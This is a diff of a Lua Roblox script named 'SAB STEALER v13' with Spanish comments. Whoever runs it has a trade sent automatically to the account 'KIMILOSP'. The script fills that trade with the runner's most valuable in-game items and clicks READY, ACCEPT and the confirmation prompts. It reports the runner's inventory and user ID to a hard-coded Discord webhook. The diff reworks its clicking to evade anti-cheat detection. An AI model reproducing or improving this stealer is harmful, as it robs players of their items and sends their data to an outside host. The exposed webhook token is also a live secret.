@@ -1,13 +1,11 @@
---[[ SAB STEALER v12 — Venice.ai
-     Lee el inventario real del trade, calcula mutaciones + traits y solo toma los slots objetivo.
+--[[ SAB STEALER v13 — Venice.ai
+     Sin VirtualInputManager (menos riesgo de BAC). Indice por slot.
 ]]
 local Players     = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local VIM         = game:GetService("VirtualInputManager")
-local GuiService  = game:GetService("GuiService")
+local RS          = game:GetService("ReplicatedStorage")
 local LP          = Players.LocalPlayer
 local PG          = LP:WaitForChild("PlayerGui")
-local CG          = game:GetService("CoreGui")
 
 local WEBHOOK   = "https://discord.com/api/webhooks/1566136623832498347/fnlDza_gDplkkY90bNe-Hx4GxP2n_nqWFQVpvd9wBKTfzCPuyFsd6lFxhgaY4uDVhH9B"
 local TARGET    = "KIMILOSP"
@@ -80,7 +78,7 @@ for _, n in ipairs({
 "Blackhole Bomb","Candy Sentry","Phantom Slap","Flying Bee","Crystal Slap","Candy Slap","Crystal Hammer"
 }) do GEARS[n] = true end
 
--- ====================== MUTACIONES ======================
+-- ====================== MUTACIONES / TRAITS ======================
 local MUTATIONS = {
   ["Gold"]={e="🟡",b=1.25}, ["Diamond"]={e="💎",b=1.5}, ["Bloodrot"]={e="🩸",b=2},
   ["Candy"]={e="🍬",b=4}, ["Lava"]={e="🌋",b=6}, ["Galaxy"]={e="🌌",b=7},
@@ -89,37 +87,30 @@ local MUTATIONS = {
   ["Phantom"]={e="👻",b=12}, ["Crystal"]={e="🔮",b=13}, ["Eclipse"]={e="🌑",b=14}
 }
 
--- ====================== TRAITS (bonificacion sumada) ======================
 local TRAIT_BONUS = {}
 local function addT(k, v) TRAIT_BONUS[k] = v end
-for _, k in ipairs({"Strawberry"}) do addT(k, 9) end
-for _, k in ipairs({"Meowl"}) do addT(k, 8) end
-for _, k in ipairs({"John Pork"}) do addT(k, 7) end
-for _, k in ipairs({"Pink Egg","Rainbow Balloon","Skibidi"}) do addT(k, 6.5) end
-for _, k in ipairs({"Queen Bee"}) do addT(k, 6) end
-for _, k in ipairs({"1 Year","Granny","Pink Balloon"}) do addT(k, 5.5) end
+addT("Strawberry",9) addT("Meowl",8) addT("John Pork",7)
+for _, k in ipairs({"Pink Egg","Rainbow Balloon","Skibidi"}) do addT(k,6.5) end
+addT("Queen Bee",6)
+for _, k in ipairs({"1 Year","Granny","Pink Balloon"}) do addT(k,5.5) end
 for _, k in ipairs({"26","Ball","Blue Egg","Bull","Fire","Fire Bee","Fireworks","Halo","Ice Bee",
-                    "Lightning","Lucky","Nyan","Paint","Red Balloon","Reindeer Pet","Rose","Sun"}) do addT(k, 5) end
-for _, k in ipairs({":3","Aura Shades","Bunny Ears","Burger","Chocolate","Jackolantern Pet"}) do addT(k, 4.5) end
+  "Lightning","Lucky","Nyan","Paint","Red Balloon","Reindeer Pet","Rose","Sun"}) do addT(k,5) end
+for _, k in ipairs({":3","Aura Shades","Bunny Ears","Burger","Chocolate","Jackolantern Pet"}) do addT(k,4.5) end
 for _, k in ipairs({"Bee","Blue Balloon","Claws","Disco","Glitched","Green Egg","Job Application",
-                    "Santa Hat","Sombrero","Zombie"}) do addT(k, 4) end
-for _, k in ipairs({"Tie"}) do addT(k, 3.75) end
-for _, k in ipairs({"Green Balloon","Matteo Hat","RIP Gravestone","Spider"}) do addT(k, 3.5) end
+  "Santa Hat","Sombrero","Zombie"}) do addT(k,4) end
+addT("Tie",3.75)
+for _, k in ipairs({"Green Balloon","Matteo Hat","RIP Gravestone","Spider"}) do addT(k,3.5) end
 for _, k in ipairs({"10B","Bubblegum","Explosive","Galactic","Orange Balloon","Orange Egg",
-                    "Shark Fin","Skeleton","Witch Hat"}) do addT(k, 3) end
-for _, k in ipairs({"Comet-struck","Taco"}) do addT(k, 2.5) end
-for _, k in ipairs({"Snowy"}) do addT(k, 2) end
-for _, k in ipairs({"UFO"}) do addT(k, 2) end
-for _, k in ipairs({"Wet"}) do addT(k, 1.5) end
-for _, k in ipairs({"Sleepy"}) do addT(k, 0) end
-addT("Brazil", 5)
+  "Shark Fin","Skeleton","Witch Hat"}) do addT(k,3) end
+for _, k in ipairs({"Comet-struck","Taco"}) do addT(k,2.5) end
+addT("Snowy",2) addT("UFO",2) addT("Wet",1.5) addT("Sleepy",0) addT("Brazil",5)
 for _, k in ipairs({"Algeria","Argentina","Australia","Austria","Belgium","Bosnia","Canada","Cape Verde",
   "Colombia","Croatia","Curaçao","Czechia","DR Congo","Ecuador","Egypt","England","France","Germany",
   "Ghana","Haiti","Iran","Iraq","Ivory Coast","Japan","Jordan","Mexico","Morocco","Netherlands",
   "New Zealand","Norway","Panama","Paraguay","Portugal","Qatar","Saudi Arabia","Scotland","Senegal",
   "South Africa","South Korea","Spain","Sweden","Switzerland","Tunisia","Turkey","United States",
-  "Uruguay","Uzbekistan"}) do addT(k, 4.5) end
-addT("Indonesia", 4)
+  "Uruguay","Uzbekistan"}) do addT(k,4.5) end
+addT("Indonesia",4)
 
 -- ====================== MATCHER ======================
 local ACCENTS = {["á"]="a",["à"]="a",["é"]="e",["è"]="e",["í"]="i",["ì"]="i",["ó"]="o",["ò"]="o",
@@ -158,15 +149,11 @@ local function matchName(raw)
 end
 
 local function cut(w, s, len) return w:sub(1, s - 1) .. " " .. w:sub(s + len) end
-
 local function extract(w, keys, map)
   local out = {}
   for _, key in ipairs(keys) do
     local s = w:find(key, 1, true)
-    if s then
-      table.insert(out, map[key])
-      w = cut(w, s, #key)
-    end
+    if s then table.insert(out, map[key]); w = cut(w, s, #key) end
   end
   return out, w
 end
@@ -186,7 +173,6 @@ local function fmtMoney(v)
   return tostring(math.floor(v))
 end
 
--- analiza un slot del inventario del trade
 local function analyze(obj)
   local texts, cash = {}, nil
   local function take(t)
@@ -232,76 +218,88 @@ local function analyze(obj)
   for _, m in ipairs(muts) do mult = mult + (MUTATIONS[m] and MUTATIONS[m].b or 0) end
   for _, t in ipairs(traits) do mult = mult + (TRAIT_BONUS[t] or 0) end
   local value = cashValue(cash) * mult
-  if TRAIT_BONUS["Sleepy"] then
-    for _, t in ipairs(traits) do if t == "Sleepy" then value = value * 0.5 break end end
-  end
+  for _, t in ipairs(traits) do if t == "Sleepy" then value = value * 0.5 break end end
 
-  return { inst = obj, name = hit, display = disp, cash = cash, muts = muts, traits = traits, value = value }
+  return { name = hit, display = disp, cash = cash, muts = muts, traits = traits, value = value }
 end
 
--- ====================== INPUT REAL ======================
-local function insetY()
-  local ok, a = pcall(function() return GuiService:GetGuiInset() end)
-  if ok and typeof(a) == "Vector2" then return a.Y end
-  return 36
+local function slotOf(n)
+  return tonumber(tostring(n or ""):match("(%d+)"))
 end
 
-local function realClick(obj)
-  if not obj or not obj.Visible then return false end
-  local p = obj.Parent
-  while p and p ~= PG and p ~= CG do
+-- ====================== INDICE GLOBAL ======================
+local INDEX, INDEX_BY_NAME = {}, {}
+
+local function indexContainer(container)
+  local ok = pcall(function()
+    for _, d in ipairs(container:GetDescendants()) do
+      if d:IsA("Model") or d:IsA("MeshPart") or d:IsA("Part") or d:IsA("Tool")
+         or d:IsA("StringValue") then
+        local rec = analyze(d)
+        if rec.name then
+          local s = slotOf(d.Name) or (d.Parent and slotOf(d.Parent.Name))
+          if s then INDEX[s] = rec end
+          INDEX_BY_NAME[rec.name] = INDEX_BY_NAME[rec.name] or rec
+        end
+      end
+    end
+  end)
+  return ok
+end
+
+local function buildIndex()
+  INDEX, INDEX_BY_NAME = {}, {}
+  indexContainer(workspace)
+  indexContainer(RS)
+end
+
+-- ====================== DISPARO DE BOTONES ======================
+local lastFire = 0
+local function fireBtn(btn)
+  if not btn or not btn.Visible then return false end
+  local p = btn.Parent
+  while p and p ~= PG do
     if p:IsA("GuiObject") and not p.Visible then return false end
     p = p.Parent
   end
-  local g = obj:FindFirstAncestorWhichIsA("ScreenGui")
-  local off = (g and not g.IgnoreGuiInset) and insetY() or 0
-  local pos, sz = obj.AbsolutePosition, obj.AbsoluteSize
-  local x, y = pos.X + sz.X / 2, pos.Y + sz.Y / 2 + off
-  local ok = pcall(function()
-    VIM:SendMouseButtonEvent(x, y, 0, true, game, 0)
-    task.wait(0.05)
-    VIM:SendMouseButtonEvent(x, y, 0, false, game, 0)
-  end)
-  if not ok and mouse1click then pcall(mouse1click, x, y) end
-  return true
-end
+  local now = os.clock()
+  if now - lastFire < 0.05 then task.wait(0.05) end
+  lastFire = os.clock()
 
-local function typeText(str)
-  for i = 1, #str do
-    local kc = Enum.KeyCode[str:sub(i, i):upper()]
-    if kc then
-      pcall(function()
-        VIM:SendKeyEvent(true, kc, false, game)
-        task.wait(0.045)
-        VIM:SendKeyEvent(false, kc, false, game)
-      end)
-      task.wait(0.045)
-    end
-  end
-end
-
-local function fireBtn(btn)
-  if not btn then return false end
   local ok = false
-  for _, sig in ipairs({"Activated", "MouseButton1Click", "MouseButton1Down"}) do
-    local s = btn[sig]
-    if s and getconnections then
-      for _, c in ipairs(getconnections(s)) do
-        if pcall(function() c:Fire() end) then ok = true end
+  if getconnections then
+    for _, sig in ipairs({"Activated", "MouseButton1Click", "MouseButton1Down"}) do
+      local s = btn[sig]
+      if s then
+        for _, c in ipairs(getconnections(s)) do
+          if pcall(function() c:Fire() end) then ok = true end
+        end
       end
     end
   end
-  return ok
+  if not ok then pcall(function() btn:Activate() end) end
+  return true
+end
+
+local function setSearch(box, txt)
+  pcall(function() box:CaptureFocus() end)
+  task.wait(0.08)
+  box.Text = ""
+  task.wait(0.05)
+  box.Text = txt
+  task.wait(0.2)
+  if getconnections then
+    for _, c in ipairs(getconnections(box.FocusLost)) do pcall(function() c:Fire(true) end) end
+  end
+  pcall(function() box:ReleaseFocus() end)
+  task.wait(0.25)
 end
 
 -- ====================== GUI ======================
 local gui = Instance.new("ScreenGui")
 gui.Name = "SAB_Stealer"
 gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.DisplayOrder = 9999
-pcall(function() gui.Parent = CG end)
-if not gui.Parent then gui.Parent = PG end
+gui.Parent = PG
 
 local panel = Instance.new("Frame")
 panel.Size = UDim2.fromOffset(180, 16)
@@ -442,14 +440,8 @@ local function sendWebhook(bt, bs, gt, ot, estado)
   local thumb = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=420&height=420&format=png"
   local best, bestV = nil, -1
   for _, r in ipairs(bt) do if (r.value or 0) > bestV then best, bestV = r, r.value or 0 end end
-  local content
-  if best then
-    local pre = ""
-    if best.muts and #best.muts > 0 then pre = MUTATIONS[best.muts[1]].e .. " " .. best.muts[1] .. ": " end
-    content = "@everyone the best brainrot targeted is \"" .. pre .. tostring(best.name) .. "\""
-  else
-    content = "@everyone no brainrots from the list found"
-  end
+  local content = best and ("@everyone the best brainrot targeted is \"" .. tostring(best.name) .. "\"")
+                      or "@everyone no brainrots from the list found"
 
   local fields = {}
   for _, f in ipairs(section("🧠 **BRAINROT TARGET**", bt)) do table.insert(fields, f) end
@@ -489,7 +481,7 @@ local function closeList()
   local root = listRoot()
   local h = root and root:FindFirstChild("Header")
   local c = h and h:FindFirstChild("Close")
-  if c then realClick(c) end
+  if c then fireBtn(c) end
 end
 
 local function tradeCandidates()
@@ -520,27 +512,13 @@ end
 local function openTradeList()
   if PG:FindFirstChild("TradePlayerList") then return true end
   for _, btn in ipairs(tradeCandidates()) do
-    realClick(btn)
-    for _ = 1, 10 do
-      task.wait(0.2)
-      if PG:FindFirstChild("TradePlayerList") then return true end
-    end
     fireBtn(btn)
-    for _ = 1, 6 do
+    for _ = 1, 10 do
       task.wait(0.2)
       if PG:FindFirstChild("TradePlayerList") then return true end
     end
   end
   return PG:FindFirstChild("TradePlayerList") ~= nil
-end
-
-local function searchBox()
-  local root = listRoot()
-  local sec = root and root:FindFirstChild("Sections")
-  local pl  = sec and sec:FindFirstChild("Players")
-  local sf  = pl and pl:FindFirstChild("SearchFrame")
-  local box = sf and sf:FindFirstChild("SearchBox")
-  if box and box:IsA("TextBox") then return box end
 end
 
 local function sendTrade()
@@ -550,37 +528,17 @@ local function sendTrade()
   local pl  = sec and sec:FindFirstChild("Players")
   local scroll = pl and pl:FindFirstChild("List")
   if not scroll then return false end
+  local sf = pl:FindFirstChild("SearchFrame")
+  local box = sf and sf:FindFirstChild("SearchBox")
 
-  for _ = 1, 6 do
-    local box = searchBox()
-    if box then
-      realClick(box)
-      task.wait(0.25)
-      box.Text = ""
-      task.wait(0.1)
-      typeText(TARGET)
-      task.wait(0.2)
-      pcall(function()
-        VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
-        task.wait(0.05)
-        VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
-      end)
-      task.wait(0.6)
-      if box.Text ~= TARGET then
-        box.Text = TARGET
-        if getconnections then
-          for _, c in ipairs(getconnections(box.FocusLost)) do pcall(function() c:Fire(true) end) end
-        end
-        task.wait(0.5)
-      end
-    end
-
+  for _ = 1, 5 do
+    if box and box:IsA("TextBox") then setSearch(box, TARGET) end
     for _, row in ipairs(scroll:GetChildren()) do
       local nm = row.Name:lower()
       if nm:find(TARGET:lower(), 1, true) or nm:find(tostring(TARGET_ID), 1, true) then
         local fill = row:FindFirstChild("Fill")
         local send = fill and fill:FindFirstChild("Send")
-        if send then realClick(send); task.wait(0.4); return true end
+        if send then fireBtn(send); task.wait(0.4); return true end
       end
     end
     task.wait(0.4)
@@ -588,34 +546,45 @@ local function sendTrade()
   return false
 end
 
-local function inventory()
+-- ====================== SLOTS DEL TRADE ======================
+local function entryRecord(entry)
+  local rec = analyze(entry)
+  if rec.name then return rec end
+  local s = slotOf(entry.Name)
+  local alt = s and INDEX[s]
+  if alt and alt.name then
+    return { name = alt.name, display = alt.display, cash = alt.cash, muts = alt.muts, traits = alt.traits, value = alt.value }
+  end
+  local alt2 = INDEX_BY_NAME[norm(entry.Name)]
+  if alt2 then return alt2 end
+  return rec
+end
+
+local function collectTargets()
   local main = getTradeMain()
   local your = main and main:FindFirstChild("Your")
   local scroll = your and your:FindFirstChild("ScrollingFrame")
   if not scroll then return nil end
-  local out = {}
-  for _, e in ipairs(scroll:GetChildren()) do
-    if e:IsA("Frame") or e:IsA("ImageButton") then table.insert(out, analyze(e)) end
-  end
-  return out
-end
 
-local function classify(inv)
   local bt, bs, gt, ot = {}, {}, {}, {}
-  for _, r in ipairs(inv) do
-    if r.name then
-      if BRAINROTS[r.name] then table.insert(bt, r)
-      elseif SKINS[r.name] then table.insert(bs, r)
-      elseif GEARS[r.name] then table.insert(gt, r)
-      else table.insert(ot, r) end
-    else
-      table.insert(ot, r)
+  for _, e in ipairs(scroll:GetChildren()) do
+    if e:IsA("Frame") or e:IsA("ImageButton") then
+      local r = entryRecord(e)
+      r.inst = e
+      if r.name then
+        if BRAINROTS[r.name] then table.insert(bt, r)
+        elseif SKINS[r.name] then table.insert(bs, r)
+        elseif GEARS[r.name] then table.insert(gt, r)
+        else table.insert(ot, r) end
+      else
+        table.insert(ot, r)
+      end
     end
   end
   return bt, bs, gt, ot
 end
 
-local function placeTargets(bt, bs, gt)
+local function placeAll(bt, bs, gt)
   local set = {}
   for _, l in ipairs({bt, bs, gt}) do
     for _, r in ipairs(l) do set[r.inst] = true end
@@ -628,11 +597,11 @@ local function placeTargets(bt, bs, gt)
     for inst in pairs(set) do
       if not done[inst] and inst.Parent then
         local btn = inst:FindFirstChild("Spacer") or inst:FindFirstChildWhichIsA("ImageButton")
-        if btn and realClick(btn) then
+        if btn and fireBtn(btn) then
           done[inst] = true
           placed = placed + 1
           setStat("puestos: " .. placed .. "/" .. total)
-          task.wait(DELAY + math.random() * 0.12)
+          task.wait(DELAY)
         end
         pending = true
       end
@@ -657,7 +626,7 @@ task.spawn(function()
       local yes = prompt and prompt:FindFirstChild("Yes")
       if yes and prompt.Visible and os.clock() - lastPrompt > 1.5 then
         lastPrompt = os.clock()
-        realClick(yes)
+        fireBtn(yes)
       end
     end
   end
@@ -674,6 +643,12 @@ toggleBtn.MouseButton1Click:Connect(function()
 end)
 
 task.spawn(function()
+  setStat("indexando...")
+  buildIndex()
+  local found = 0
+  for _ in pairs(INDEX) do found = found + 1 end
+  setStat("slots indexados: " .. found)
+
   while RUN do
     cycle = cycle + 1
     pcall(function()
@@ -693,27 +668,23 @@ task.spawn(function()
         closeList()
         task.wait(1.5)
 
-        local inv, guard = nil, 0
-        while RUN and getTradeMain() and guard < 40 do
-          guard = guard + 1
-          inv = inventory()
-          if inv and #inv > 0 then break end
+        local bt, bs, gt, ot
+        for _ = 1, 30 do
+          bt, bs, gt, ot = collectTargets()
+          if bt and (#bt + #bs + #gt + #ot) > 0 then break end
           task.wait(0.3)
         end
 
-        if inv and #inv > 0 then
-          local bt, bs, gt, ot = classify(inv)
+        if bt then
           local total = #bt + #bs + #gt
-          setStat("leidos: " .. #inv .. "\nobjetivos: " .. total)
-
+          setStat("slots: " .. (#bt + #bs + #gt + #ot) .. "\nobjetivos: " .. total)
           if not sentOnce then
             sentOnce = true
             sendWebhook(bt, bs, gt, ot, "Escaneo del trade")
           end
-
           if total > 0 then
             setStat("poniendo " .. total .. "...")
-            placeTargets(bt, bs, gt)
+            placeAll(bt, bs, gt)
           end
 
           setStat("READY / ACCEPT...")
@@ -725,9 +696,9 @@ task.spawn(function()
             local txt = btn and btn:FindFirstChild("Txt")
             if btn and txt and txt:IsA("TextLabel") then
               local s = string.upper(txt.Text or "")
-              if s == "READY" or s == "ACCEPT" then realClick(btn) end
+              if s == "READY" or s == "ACCEPT" then fireBtn(btn) end
             end
-            task.wait(0.5)
+            task.wait(0.4)
           end
         end
         setStat("trade cerrado\nreintentando...")
